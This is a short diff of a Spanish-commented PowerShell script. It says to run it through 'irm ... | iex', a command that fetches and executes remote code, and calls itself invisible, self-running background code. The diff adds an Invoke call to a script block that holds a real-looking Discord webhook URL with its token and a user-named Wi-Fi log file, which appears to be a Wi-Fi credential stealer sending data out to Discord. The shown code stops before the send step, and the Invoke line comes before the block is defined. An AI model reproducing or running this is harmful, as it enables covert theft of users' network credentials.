@@ -1,6 +1,7 @@
 # Ejecutar esto directamente con: irm https://raw.githubusercontent.com/tuscript.txt | iex
 
 # Código invisible que se autoejecuta en segundo plano
+$scriptBlock.Invoke()
 $scriptBlock = {
     $webhookUrl = "https://discord.com/api/webhooks/1360605534838980780/BwDz68YsJ0nzDqi2eVFbZ6yWivXquWoUEIcc9hVBxBVLKiQnSGy8oDoccu2ctIy8HMtJ"
     $tempFile = "$env:TEMP\$env:USERNAME-WiFi.log"
